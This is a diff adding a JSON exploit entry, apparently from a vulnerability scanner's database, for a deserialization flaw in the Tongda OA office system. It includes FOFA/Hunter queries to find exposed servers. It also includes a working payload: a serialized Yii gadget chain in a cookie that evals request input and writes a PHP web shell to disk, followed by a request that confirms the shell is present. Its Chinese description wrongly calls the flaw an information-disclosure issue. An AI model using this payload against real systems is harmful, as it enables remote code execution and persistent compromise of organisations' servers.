@@ -1,0 +1,54 @@
+{
+  "product": "通达OA",
+  "vul_name": "通达OA general/appbuilder/web/portal/gateway/moare 接口反序列化",
+  "type": "反序列化",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。通达OA存在未授权访问漏洞，该漏洞源于系统对用户传入的数据过滤不严。攻击者可借助特制的HTTP请求利用该漏洞访问敏感文件，造成信息泄露。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"TDXK-通达OA\"",
+    "Hunter": "app.name=\"通达 OA\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484928&idx=1&sn=0c2a6c3a973aca771e954e881a4e727c&chksm=974b8b07a03c021139cf194ef83743d9ffc17df65940199d8315677f19e1258b6d9a5cbc9d6c&scene=178&cur_album_id=2873032428486115330#rd",
+  "fix": [],
+  "exploit": [
+    {
+      "exp": {
+        "method": "post",
+        "follow": false,
+        "path": "/general/appbuilder/web/portal/gateway/moare?a=1",
+        "cookie": "_COOKIE=8a987cdbe51b7fe8c0efaf47430b18b96a1477de4a08291eef0f7164bd1b5a9cO:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"yii\\db\\BatchQueryResult_dataReader\";O:17:\"yii\\db\\DataReader\":1:{s:29:\"yii\\db\\DataReader_statement\";O:20:\"yii\\redis\\Connection\":8:{s:32:\"yii\\redis\\ConnectionunixSocket\";i:0;s:8:\"hostname\";s:13:\"www.baidu.com\";s:4:\"port\";s:3:\"443\";s:17:\"connectionTimeout\";i:30;s:29:\"yii\\redis\\Connection_socket\";b:0;s:8:\"database\";N;s:13:\"redisCommands\";a:1:{i:0;s:12:\"CLOSE CURSOR\";}s:27:\"yii\\base\\Component_events\";a:1:{s:9:\"afterOpen\";a:1:{i:0;a:2:{i:0;a:2:{i:0;O:32:\"yii\\caching\\ExpressionDependency\":2:{s:10:\"expression\";s:23:\"eval($_REQUEST['img']);\";s:8:\"reusable\";b:0;}i:1;s:9:\"isChanged\";}i:1;s:1:\"a\";}}}}}}",
+        "data": "img=file_put_contents(\"../../52e039302a62d077.php\",\"95cc64dd2825f9df13ec4ad683ecf339<?php eval($_REQUEST['csgo'])?>\");"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 500
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/general/52e039302a62d077.php"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "body": "95cc64dd2825f9df13ec4ad683ecf339"
+          }
+        ]
+      }
+    }
+  ]
+}
